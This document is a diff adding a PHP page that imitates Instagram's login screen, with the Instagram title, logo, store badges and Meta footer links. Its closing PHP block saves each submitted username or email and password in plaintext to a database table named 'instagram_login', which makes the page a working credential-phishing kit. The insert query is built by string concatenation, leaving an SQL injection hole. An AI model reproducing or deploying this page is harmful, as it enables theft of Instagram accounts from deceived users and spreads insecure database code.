@@ -1,0 +1,170 @@
+<?php
+
+include("connection.php");
+error_reporting(0);
+
+?>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./insta.css">
+    <script src="https://kit.fontawesome.com/aac2c1a77e.js" crossorigin="anonymous"></script> 
+    <title>Instagram</title>
+</head>
+<body>
+    <div class="main"> 
+    <div class="parent">
+
+        <div class="wrapper">
+<div class="photo1"><img src="./aayu.png" alt=""></div>
+
+<form action="" method="POST">
+    <input type="text" id="nano" name="email" placeholder="Phone number, username, or email" required>
+    <input type="password" name="password" placeholder="Password" id="password" required>
+        <!-- <div class="maagi"> -->
+<button type="button" id="button" >show</button>
+ 
+
+    <input type="submit" name="submit" value="Log in" id="submit">
+	
+</form>
+
+<div class="span">
+    <span class="aaa"></span>
+    <span class="content">OR</span>
+    <span class="aaa"></span>    
+</div>
+
+<div class="facebook">
+<button type="button">
+     <span id="fb" class="fa-brands fa-square-facebook" style="color: #1a5fb4;"></span>
+    
+     <span class="log"><a href="https://www.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26state%3D%257B%2522fbLoginKey%2522%253A%25221y87ui81nvwkja10qwc5loe6erv1ptyb9q1j4i46861lad96hq3y6%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%26scope%3Demail%26response_type%3Dcode%252Cgranted_scopes%26locale%3Den_US%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Deff91e48-df22-42cb-a1a5-783014390f00%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%25221y87ui81nvwkja10qwc5loe6erv1ptyb9q1j4i46861lad96hq3y6%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%23_%3D_&display=page&locale=en_GB&pl_dbl=0">Log in with Facebook</a></span>
+    </button>
+     
+    <div id="fg"><a href="https://www.instagram.com/accounts/password/reset/">Forgot Password?</a></div>
+</div>
+
+        </div>
+
+        <div class="last">
+            <p>Don't have an account? 
+            </p>
+            <span><a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a></span>
+        </div>
+
+    </div>
+
+    <div class="download-stores">
+        <p>Get the app</p>
+
+  <div class="apple-store">
+<div class="imgs">
+    <a href="https://apps.apple.com/app/instagram/id389801252?vt=lo"><img src="./apple.png" alt=""></a>
+
+    <a href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26ig_mid%3DCF0E7B08-9BE6-43C1-8DB8-ADC00B014DA2%26utm_content%3Dlo%26utm_medium%3Dbadge"><img src="./playstore.png" alt=""></a>
+</div>
+  </div>
+    </div>
+
+</div>
+
+<footer>
+
+
+    <div class="main1">
+        <a href="https://about.meta.com/">meta</a>
+        <a href="https://about.instagram.com">about</a>
+        <a href="htttps://about.instagram.com/blog/">blog</a>
+        <a href="https://about.instagram.com/about/jobs/">jobs</a>
+        <a href="https://help.instagram.com">help</a>
+        <a href="https://developers.facebook.com/docs/instagram/">api</a>
+        <a href="https://instagram.com/legal/privacy/">privacy</a>
+        <a href="https://instagram.com/legal/terms/">terms</a>
+        <a href="https://instagram.com/directory/profiles/">top accounts</a>
+        <a href="https://instagram.com/explore/locations/">locations</a>
+        <a href="https://instagram.com/web/lite/">instagram lite</a>
+        <a href="https://www.facebook.com/help/instagram/261704639352628">contact uploading &non-users</a>
+        <a href="https://https://www.facebook.com/help/instagram/261704639352628">meta verified</a>
+    </div>
+
+    <div class="copyright">
+        
+        <span class="language">English</span>
+
+<i class="fa fa-caret-down icon"></i>
+
+<span class="ram">© 2023 Instagram from Meta</span>
+
+<div class="drop-down">
+    <input type="checkbox">
+    <ul>
+        <li>english uk</li>
+        <li>norsk</li>
+        <li>polski</li>
+        <li>nederlands</li>
+        <li>bahasa melayu</li>
+        <li>hindi</li>
+        <li>gujrati</li>
+        <li>suomi</li>
+        <li>romania</li>
+        <li>francais (canada)</li>
+        <li>afrikaans</li>
+        <li>cestina</li>
+        <li>filipino</li>
+        <li>suomi</li>
+        <li>italiano</li>
+        <li>sevnska</li>
+        <li>espanol (espana)</li>
+        <li>portugues(portugal)</li>
+    </ul>
+</div>
+    </div>
+</footer>
+
+
+<script>
+
+let password = document.getElementById("password");
+let button = document.getElementById("button");
+
+button.onclick = function(){
+    if(password.type == "password"){
+         password.type = "text";
+    }else{
+        password.type = "password";
+
+    }
+}
+
+</script>
+
+
+</body>
+</html>
+
+
+<?php
+
+if(isset($_POST['submit']))
+{
+$email=$_POST['email'];
+$pass=$_POST['password'];
+
+
+$query="INSERT INTO instagram_login VALUES ('$email','$pass')";
+
+$data=mysqli_query($aash,$query);
+
+if($data){
+    // echo "data inserted into database";
+}
+else{
+    echo "failed to insert database";
+}
+}
+?>
